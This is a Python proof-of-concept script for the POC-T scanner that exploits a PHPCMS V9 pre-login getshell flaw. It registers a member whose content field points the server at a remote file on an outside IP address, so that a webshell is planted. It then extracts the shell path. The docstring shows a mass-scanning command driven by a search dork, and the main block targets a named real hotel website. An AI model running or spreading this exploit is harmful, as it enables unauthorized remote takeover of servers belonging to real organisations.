# !/usr/bin/env python
#  -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = 野驴~

"""
phpcms-V9 前台getshell 无需登录
python POC-T -s phpcmsV9-getshell -aG "power by phpcmsV9" --limit 100
"""

import re

import requests

from plugin.util import randomDigits
from plugin.util import randomString


def poc(url):
    domain = url.split('://')[-1].split('/')[0]  # 将url转化为domain
    hdomain = 'http://' + domain  # 将域名转化为带http://的域名
    upload_path = hdomain + '/index.php?m=member&c=index&a=register&siteid=1'  # vul路径
    parttern = '[^<]+(?=>)'  # 正则匹配<>中的内容

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0',
        'Cookie': 'duiqS_admin_username=e2148Lx9jxWqd27zJW60NoZECjpCzY-kJHaDRtsJdNN-D14; duiqS_siteid=7f10PWN8e2aLJ8cDReSbX_NTPYZUwUTTf0QLOMix; duiqS_userid=d73dm3IxOKQZiIl0oDUfv1qRKPN7eYkeRy4xYTe2; duiqS_admin_email=fe549jr0y5NPbP8-awEI3pa2RERM9d6oloN6wm9p0LqSCnT0MqQ69lB8RxYNpA; duiqS_sys_lang=ed63dNwVysDCLfwqVe_ZO7ldqXSRC0O1cpABQ5YimBw-4A; BEEFHOOK=Y2fW9i6P441d2vBvjLkgKjlcdTaAj8URI1T1Z7Wx9nZtMJEcrTkp5o7B0uI7AjQr5RsfoGc8ZtlG8U3F; PHPSESSID=o2l47tha69a46khl82341gc8m0'
    }

    post_data = {
        'siteid': '1',
        'modelid': '11',
        'username': randomString(10),
        'password': randomDigits(8),
        'email': randomString(5) + randomDigits(5) + '@qq.com',
        'info[content]': '<img src=http://118.180.7.28:8081/2.txt?.php#.jpg>',
        'dosubmit': '1',
        'protocol': ''
    }

    try:
        r = requests.post(url=upload_path, data=post_data, headers=headers, time=3)
        if r.status_code is 200 and 'INSERT' in r.content:
            shell_path = re.findall(parttern, r.content, re.I | re.M)  # 提取webshell路径
            return shell_path

    except Exception:
        return False

    return False


if __name__ == '__main__':
    print poc("http://www.wandahotels.com")
